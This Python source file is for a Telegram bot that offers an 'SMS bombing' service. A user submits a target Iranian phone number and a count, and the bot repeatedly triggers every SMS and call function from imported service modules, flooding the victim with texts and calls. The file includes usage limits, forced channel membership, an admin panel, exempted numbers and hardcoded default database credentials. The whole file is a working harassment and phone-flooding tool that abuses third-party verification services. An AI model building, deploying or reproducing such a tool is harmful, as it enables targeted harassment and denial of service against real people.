import os
from dotenv import load_dotenv
import telebot
from telebot.asyncio_storage import StateMemoryStorage
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import logging
import mysql.connector
from threading import Thread, Event
from time import sleep
from inspect import getmembers, isfunction
from datetime import datetime, timedelta

# github.com/z0orday

from Api import sms, call

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot_token = os.getenv('BOT_TOKEN')
if not bot_token:
    logger.error("BOT_TOKEN is not set in the environment variables.")
    raise ValueError("BOT_TOKEN must be set in the environment variables.")

try:
    bot = telebot.TeleBot(bot_token, state_storage=StateMemoryStorage())
    logger.info("Bot initialized successfully.")
except Exception as e:
    logger.error(f"Failed to initialize bot: {e}")
    raise

SMS_SERVICES = [i[0] for i in getmembers(sms, isfunction)]
CALL_SERVICES = [i[0] for i in getmembers(call, isfunction)]
MAIN_CHANNEL_ID = os.getenv('MAIN_CHANNEL_ID')

DB_NAME = os.getenv('DB_NAME', 'Exosms')
DB_HOST = os.getenv('DB_HOST', 'localhost')
DB_USER = os.getenv('DB_USER', 'z0roday')
DB_PASS = os.getenv('DB_PASS', 'z0roday@@123%&&&')

bombing_events = {}

LANGUAGES = {
    'en': {
        'welcome': "Welcome, {}!",
        'admin': "Admin",
        'limit_reached': "You have reached your usage limit",
        'choose_option': "Please choose an option:",
        'join_channel': "Please join our channel first:",
        'join_button': "Join Channel",
        'confirm_membership': "Confirm Membership",
        'no_permission': "You don't have permission to access the admin panel.",
        'admin_panel': "Admin panel:",
        'enter_target': "Please enter your Target Phone Number: ex 09000000000",
        'invalid_phone': "Invalid input. Please enter a valid 11-digit phone number.",
        'number_not_found': "Number Not Found!\n /start",
        'enter_count': "Please enter a number between 1 and 30:",
        'invalid_count': "Invalid input. Please enter a numeric value between 1 and 30.",
        'bombing_started': "Starting bombing for phone: {}, count: {}",
        'cancel_bombing': "Cancel Bombing",
        'bombing_cancelled': "Bombing cancelled.",
        'bombing_finished': "Bombing finished",
        'support': "Support",
        'change_language': "Change Language",
        'number': "Number",
    },
    'fa': {
        'welcome': "خوش آمدید، {}!",
        'admin': "ادمین",
        'limit_reached': "شما به محدودیت استفاده خود رسیده‌اید",
        'choose_option': "لطفاً یک گزینه را انتخاب کنید:",
        'join_channel': "لطفاً ابتدا به کانال ما بپیوندید:",
        'join_button': "پیوستن به کانال",
        'confirm_membership': "تأیید عضویت",
        'no_permission': "شما اجازه دسترسی به پنل ادمین را ندارید.",
        'admin_panel': "پنل ادمین:",
        'enter_target': "لطفاً شماره تلفن هدف خود را وارد کنید: مثال 09000000000",
        'invalid_phone': "ورودی نامعتبر. لطفاً یک شماره تلفن 11 رقمی معتبر وارد کنید.",
        'number_not_found': "شماره پیدا نشد!\n /start",
        'enter_count': "لطفاً یک عدد بین 1 و 30 وارد کنید:",
        'invalid_count': "ورودی نامعتبر. لطفاً یک مقدار عددی بین 1 و 30 وارد کنید.",
        'bombing_started': "شروع بمباران برای شماره: {}, تعداد: {}",
        'cancel_bombing': "لغو بمباران",
        'bombing_cancelled': "بمباران لغو شد.",
        'bombing_finished': "بمباران به پایان رسید",
        'support': "پشتیبانی",
        'change_language': "تغییر زبان",
        'number': "شماره",
    },
    'ar': {
        'welcome': "مرحبًا، {}!",
        'admin': "المشرف",
        'limit_reached': "لقد وصلت إلى حد الاستخدام الخاص بك",
        'choose_option': "الرجاء اختيار خيار:",
        'join_channel': "الرجاء الانضمام إلى قناتنا أولاً:",
        'join_button': "انضم للقناة",
        'confirm_membership': "تأكيد العضوية",
        'no_permission': "ليس لديك إذن للوصول إلى لوحة المشرف.",
        'admin_panel': "لوحة المشرف:",
        'enter_target': "الرجاء إدخال رقم الهاتف المستهدف: مثال 09000000000",
        'invalid_phone': "إدخال غير صالح. الرجاء إدخال رقم هاتف صالح مكون من 11 رقمًا.",
        'number_not_found': "الرقم غير موجود!\n /start",
        'enter_count': "الرجاء إدخال رقم بين 1 و 30:",
        'invalid_count': "إدخال غير صالح. الرجاء إدخال قيمة رقمية بين 1 و 30.",
        'bombing_started': "بدء القصف للهاتف: {}, العدد: {}",
        'cancel_bombing': "إلغاء القصف",
        'bombing_cancelled': "تم إلغاء القصف.",
        'bombing_finished': "انتهى القصف",
        'support': "الدعم",
        'change_language': "تغيير اللغة",
        'number': "رقم",
    }
}

def setup_database():
    try:
        conn = mysql.connector.connect(host=DB_HOST, user=DB_USER, password=DB_PASS)
        cursor = conn.cursor()
        cursor.execute(f"CREATE DATABASE IF NOT EXISTS {DB_NAME}")
        cursor.execute(f"USE {DB_NAME}")
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            user_id BIGINT UNIQUE,
            username VARCHAR(255),
            last_use DATETIME,
            use_count INT DEFAULT 0,
            is_blocked BOOLEAN DEFAULT FALSE,
            block_until DATETIME,
            custom_limit INT DEFAULT 2,
            language VARCHAR(2) DEFAULT 'en'
        )
        ''')
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS admins (
            id INT AUTO_INCREMENT PRIMARY KEY,
            admin_id BIGINT UNIQUE
        )
        ''')
        conn.commit()
        logger.info("Database setup completed successfully.")
    except mysql.connector.Error as err:
        logger.error(f"Database setup error: {err}")
        raise
    finally:
        if 'conn' in locals() and conn.is_connected():
            cursor.close()
            conn.close()

def get_db_connection():
    try:
        return mysql.connector.connect(host=DB_HOST, user=DB_USER, password=DB_PASS, database=DB_NAME)
    except mysql.connector.Error as err:
        logger.error(f"Database connection error: {err}")
        raise

def execute_db_query(query, params=None, fetch=False):
    conn = get_db_connection()
    cursor = conn.cursor()
    try:
        cursor.execute(query, params or ())
        result = cursor.fetchall() if fetch else None
        conn.commit()
        return result
    except mysql.connector.Error as err:
        logger.error(f"Database query error: {err}")
        conn.rollback()
        return None
    finally:
        cursor.close()
        conn.close()

def save_user(user_id, username, language='en'):
    execute_db_query('''
    INSERT INTO users (user_id, username, last_use, use_count, language)
    VALUES (%s, %s, NOW(), 0, %s)
    ON DUPLICATE KEY UPDATE username = %s, language = %s
    ''', (user_id, username, language, username, language))

def get_user_language(user_id):
    result = execute_db_query('SELECT language FROM users WHERE user_id = %s', (user_id,), fetch=True)
    return result[0][0] if result else 'en'

def update_user_language(user_id, language):
    execute_db_query('UPDATE users SET language = %s WHERE user_id = %s', (language, user_id))
    keyboard = create_keyboard(user_id, language)
    bot.send_message(user_id, LANGUAGES[language]['choose_option'], reply_markup=keyboard)

def update_user_usage(user_id):
    execute_db_query('''
    UPDATE users 
    SET last_use = NOW(), use_count = use_count + 1
    WHERE user_id = %s
    ''', (user_id,))

def check_user_limit(user_id):
    result = execute_db_query('''
    SELECT use_count, last_use, is_blocked, block_until, custom_limit
    FROM users
    WHERE user_id = %s
    ''', (user_id,), fetch=True)
    
    if result:
        use_count, last_use, is_blocked, block_until, custom_limit = result[0]
        if is_blocked:
            if block_until and datetime.now() > block_until:
                unban_user(user_id)
                return True
            return False
        if use_count >= custom_limit:
            if datetime.now() - last_use > timedelta(hours=24):
                reset_user_usage(user_id)
                return True
            return False
        return True
    return True

def reset_user_usage(user_id):
    execute_db_query('''
    UPDATE users 
    SET use_count = 0, last_use = NOW()
    WHERE user_id = %s
    ''', (user_id,))

def ban_user(user_id, duration_minutes):
    block_until = datetime.now() + timedelta(minutes=duration_minutes)
    execute_db_query('''
    UPDATE users 
    SET is_blocked = TRUE, block_until = %s
    WHERE user_id = %s
    ''', (block_until, user_id))

def unban_user(user_id):
    execute_db_query('''
    UPDATE users 
    SET is_blocked = FALSE, block_until = NULL
    WHERE user_id = %s
    ''', (user_id,))

def is_admin(user_id):
    result = execute_db_query('SELECT * FROM admins WHERE admin_id = %s', (user_id,), fetch=True)
    return bool(result)

def add_admin(admin_id):
    execute_db_query('INSERT IGNORE INTO admins (admin_id) VALUES (%s)', (admin_id,))

def set_custom_limit(user_id, limit):
    execute_db_query('''
    UPDATE users 
    SET custom_limit = %s
    WHERE user_id = %s
    ''', (limit, user_id))

def check_membership(user_id):
    try:
        member = bot.get_chat_member(MAIN_CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except telebot.apihelper.ApiException:
        logger.error(f"Failed to check membership for user {user_id}")
        return False

def create_language_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"),
        InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa"),
        InlineKeyboardButton("العربية 🇸🇦", callback_data="lang_ar")
    )
    return markup

def create_keyboard(user_id, language):
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton(LANGUAGES[language]['number']), KeyboardButton(LANGUAGES[language]['support']))
    keyboard.add(KeyboardButton(LANGUAGES[language]['change_language']))
    if is_admin(user_id):
        keyboard.add(KeyboardButton(LANGUAGES[language]['admin']))
    return keyboard

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    language = get_user_language(user_id)
    
    if check_membership(user_id):
        welcome_message = LANGUAGES[language]['welcome'].format(message.from_user.first_name)
        if is_admin(user_id):
            welcome_message += f" ({LANGUAGES[language]['admin']})"
        if not check_user_limit(user_id):
            welcome_message += f"\n{LANGUAGES[language]['limit_reached']}"
        save_user(user_id, message.from_user.username, language)
        keyboard = create_keyboard(user_id, language)
        bot.send_message(message.chat.id, welcome_message)
        bot.send_message(message.chat.id, LANGUAGES[language]['choose_option'], reply_markup=keyboard)
    else:
        markup = InlineKeyboardMarkup()
        join_button = InlineKeyboardButton(text=LANGUAGES[language]['join_button'], url=f'https://t.me/{MAIN_CHANNEL_ID[1:]}')
        markup.add(join_button)
        github_button = InlineKeyboardButton(text='GitHub', url='https://github.com/z0roday')
        check_button = InlineKeyboardButton(text=LANGUAGES[language]['confirm_membership'], callback_data='check_membership')
        markup.row(github_button, check_button)
        bot.reply_to(message, LANGUAGES[language]['join_channel'], reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == LANGUAGES[get_user_language(message.from_user.id)]['admin'])
def handle_admin_panel(message):
    language = get_user_language(message.from_user.id)
    if is_admin(message.from_user.id):
        show_admin_panel(message)
    else:
        bot.reply_to(message, LANGUAGES[language]['no_permission'])

@bot.message_handler(commands=['admin'])
def show_admin_panel(message):
    language = get_user_language(message.from_user.id)
    if is_admin(message.from_user.id):
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("Admin Info", callback_data="admin_info"),
                   InlineKeyboardButton("Broadcast", callback_data="broadcast"))
        markup.row(InlineKeyboardButton("Add Admin", callback_data="add_admin"),
                   InlineKeyboardButton("Ban User", callback_data="ban_user"))
        markup.row(InlineKeyboardButton("Unban User", callback_data="unban_user"),
                   InlineKeyboardButton("Set User Limit", callback_data="set_user_limit"))
        markup.row(InlineKeyboardButton("Set Global Limit", callback_data="set_global_limit"))
        markup.row(InlineKeyboardButton("Cancel", callback_data="cancel_admin"))
        bot.send_message(message.chat.id, LANGUAGES[language]['admin_panel'], reply_markup=markup)
    else:
        bot.reply_to(message, LANGUAGES[language]['no_permission'])

@bot.message_handler(func=lambda message: message.text == LANGUAGES[get_user_language(message.from_user.id)]['change_language'])
def change_language(message):
    markup = create_language_keyboard()
    bot.reply_to(message, "Please select a language / لطفا یک زبان انتخاب کنید / الرجاء اختيار لغة", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def callback_language(call):
    language = call.data.split('_')[1]
    user_id = call.from_user.id
    update_user_language(user_id, language)
    bot.answer_callback_query(call.id, "Language updated / زبان به روز شد / تم تحديث اللغة")

@bot.message_handler(func=lambda message: message.text == LANGUAGES[get_user_language(message.from_user.id)]['number'])
def handle_sms(message):
    user_id = message.from_user.id
    language = get_user_language(user_id)
    
    if not check_membership(user_id):
        start(message)
        return
    if not check_user_limit(user_id):
        bot.reply_to(message, LANGUAGES[language]['limit_reached'])
        return
    bot.reply_to(message, LANGUAGES[language]['enter_target'])
    bot.register_next_step_handler(message, get_phone)

@bot.message_handler(func=lambda message: message.text == LANGUAGES[get_user_language(message.from_user.id)]['support'])
def handle_support(message):
    language = get_user_language(message.from_user.id)
    bot.reply_to(message, LANGUAGES[language]['support'])

@bot.callback_query_handler(func=lambda call: call.data in ["admin_info", "broadcast", "add_admin", "ban_user", "unban_user", "set_user_limit", "set_global_limit", "cancel_admin", "check_membership"])
def callback_query(call):
    language = get_user_language(call.from_user.id)
    if call.data in ["admin_info", "broadcast", "add_admin", "ban_user", "unban_user", "set_user_limit", "set_global_limit", "cancel_admin"]:
        if is_admin(call.from_user.id):
            if call.data == "admin_info":
                admin_info_command(call.message)
            elif call.data == "broadcast":
                bot.answer_callback_query(call.id, "Please enter the broadcast message:")
                bot.register_next_step_handler(call.message, process_broadcast)
            elif call.data == "add_admin":
                bot.answer_callback_query(call.id, "Please enter the user ID of the new admin:")
                bot.register_next_step_handler(call.message, process_new_admin)
            elif call.data == "ban_user":
                bot.answer_callback_query(call.id, "Please enter the user ID of the user you want to ban:")
                bot.register_next_step_handler(call.message, process_ban_user_id)
            elif call.data == "unban_user":
                bot.answer_callback_query(call.id, "Please enter the user ID of the user you want to unban:")
                bot.register_next_step_handler(call.message, process_unban_user_id)
            elif call.data == "set_user_limit":
                bot.answer_callback_query(call.id, "Please enter the user ID for whom you want to set a custom limit:")
                bot.register_next_step_handler(call.message, process_set_user_limit_id)
            elif call.data == "set_global_limit":
                bot.answer_callback_query(call.id, "Please enter the new global limit:")
                bot.register_next_step_handler(call.message, process_set_global_limit)
            elif call.data == "cancel_admin":
                bot.answer_callback_query(call.id, "Admin action cancelled.")
                bot.edit_message_text("Admin action cancelled.", 
                                      chat_id=call.message.chat.id, 
                                      message_id=call.message.message_id)
        else:
            bot.answer_callback_query(call.id, LANGUAGES[language]['no_permission'])
    elif call.data == 'check_membership':
        if check_membership(call.from_user.id):
            bot.answer_callback_query(call.id, LANGUAGES[language]['welcome'])
            welcome_message = LANGUAGES[language]['welcome'].format(call.from_user.first_name)
            if is_admin(call.from_user.id):
                welcome_message += f" ({LANGUAGES[language]['admin']})"
            keyboard = create_keyboard(call.from_user.id, language)
            bot.send_message(call.message.chat.id, welcome_message)
            bot.send_message(call.message.chat.id, LANGUAGES[language]['choose_option'], reply_markup=keyboard)
        else:
            bot.answer_callback_query(call.id, LANGUAGES[language]['join_channel'])

def get_phone(message):
    language = get_user_language(message.from_user.id)
    phone = message.text
    if not phone.isdigit() or len(phone) != 11:
        bot.reply_to(message, LANGUAGES[language]['invalid_phone'])
        bot.register_next_step_handler(message, get_phone)
        return
    
    if phone in ("09938282310", "09932539709"):
        bot.send_message(message.chat.id, LANGUAGES[language]['number_not_found'])
    else:
        bot.reply_to(message, LANGUAGES[language]['enter_count'])
        bot.register_next_step_handler(message, get_count, phone)

def get_count(message, phone):
    language = get_user_language(message.from_user.id)
    if not message.text.isdigit():
        bot.reply_to(message, LANGUAGES[language]['invalid_count'])
        bot.register_next_step_handler(message, get_count, phone)
        return
   
    count = int(message.text)
    if 1 <= count <= 30:
        bot.reply_to(message, LANGUAGES[language]['bombing_started'].format(phone, count))
        update_user_usage(message.from_user.id)
       
        bombing_events[message.chat.id] = Event()
       
        markup = InlineKeyboardMarkup()
        cancel_button = InlineKeyboardButton(LANGUAGES[language]['cancel_bombing'], callback_data="cancel_bombing")
        markup.add(cancel_button)
        bot.send_message(message.chat.id, LANGUAGES[language]['bombing_started'].format(phone, count), reply_markup=markup)
        Thread(target=bombing, args=(message.chat.id, phone, count, bombing_events[message.chat.id], language)).start()
    else:
        bot.reply_to(message, LANGUAGES[language]['invalid_count'])
        bot.register_next_step_handler(message, get_count, phone)

def bombing(chat_id, phone, count, stop_event, language):
    x = 0
    phone = f"+98{phone[1:]}"
    for j in range(count):
        if stop_event.is_set():
            bot.send_message(chat_id, LANGUAGES[language]['bombing_cancelled'])
            return
        for k in range(len(SMS_SERVICES)):
            try:
                Thread(target=getattr(sms, SMS_SERVICES[k]), args=[phone]).start()
            except Exception as e:
                logger.error(f"Error in SMS service {SMS_SERVICES[k]} for phone {phone}: {e}")
        if (j != 0) and (j % 5) == 0:
            try:
                Thread(target=getattr(call, CALL_SERVICES[x]), args=[phone]).start()
                x = (x + 1) % len(CALL_SERVICES)
            except Exception as e:
                logger.error(f"Error in Call service {CALL_SERVICES[x]} for phone {phone}: {e}")
        sleep(0.2)
    bot.send_message(chat_id, LANGUAGES[language]['bombing_finished'])
    del bombing_events[chat_id]

@bot.callback_query_handler(func=lambda call: call.data == "cancel_bombing")
def cancel_bombing_callback(call):
    language = get_user_language(call.from_user.id)
    chat_id = call.message.chat.id
    if chat_id in bombing_events:
        bombing_events[chat_id].set()
        bot.answer_callback_query(call.id, LANGUAGES[language]['bombing_cancelled'])
        bot.edit_message_text(LANGUAGES[language]['bombing_cancelled'], chat_id=chat_id, message_id=call.message.message_id)
    else:
        bot.answer_callback_query(call.id, LANGUAGES[language]['bombing_finished'])

if __name__ == "__main__":
    try:
        setup_database()
        admin_id = os.getenv('ADMIN_ID')
        if admin_id:
            add_admin(int(admin_id))
        else:
            logger.warning("ADMIN_ID environment variable is not set")
        logger.info("Bot is starting...")
        while True:
            try:
                logger.info("Starting bot polling...")
                bot.polling(none_stop=True, interval=1, timeout=20)
            except Exception as e:
                logger.error(f"Bot polling error: {e}")
                sleep(5)
    except Exception as e:
        logger.critical(f"Critical error: {e}")
        raise
